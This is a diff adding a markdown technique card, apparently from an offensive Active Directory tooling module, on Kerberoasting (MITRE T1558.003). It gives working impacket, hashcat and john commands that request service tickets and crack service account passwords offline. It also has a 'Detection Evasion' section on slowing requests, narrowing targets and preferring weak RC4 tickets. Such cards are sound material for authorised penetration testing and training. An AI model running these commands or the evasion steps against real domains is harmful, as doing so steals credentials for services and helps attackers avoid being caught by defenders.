@@ -1,0 +1,41 @@
+---
+name: kerberoast
+phase: ad
+mitre_ids: [T1558.003]
+opsec_level: 3
+description: Request TGS tickets for SPNs and crack offline to obtain service account passwords
+module: phantom-ad
+tools: [impacket, hashcat, john]
+prerequisites: [domain_user_cred, domain_controller_ip]
+---
+# Kerberoasting
+
+## Technique
+Request Kerberos TGS (Ticket Granting Service) tickets for accounts that have
+Service Principal Names (SPNs) registered.  The tickets are encrypted with the
+service account's NTLM hash and can be cracked offline.
+
+## Commands
+```bash
+# Request all TGS tickets and save to file (impacket)
+impacket-GetUserSPNs DOMAIN/user:password@DC_IP -request -outputfile hashes.txt
+
+# Crack with hashcat (mode 13100 = Kerberos 5 TGS-REP etype 23)
+hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force
+
+# Alternative: crack with john
+john --format=krb5tgs hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+## Usage
+1. Enumerate SPNs to identify service accounts worth targeting.
+2. Request tickets for high-value SPNs (MSSQLSvc, HTTP, CIFS).
+3. Crack offline — no further interaction with the DC required.
+
+## Detection Evasion
+- Use `-delay` flag to slow ticket requests and avoid Kerberos anomaly detection.
+- Target only high-value SPNs rather than requesting all tickets at once.
+- AES-encrypted tickets (etype 18) are harder to crack — prefer RC4 (etype 23).
+
+## MITRE ATT&CK
+- T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting
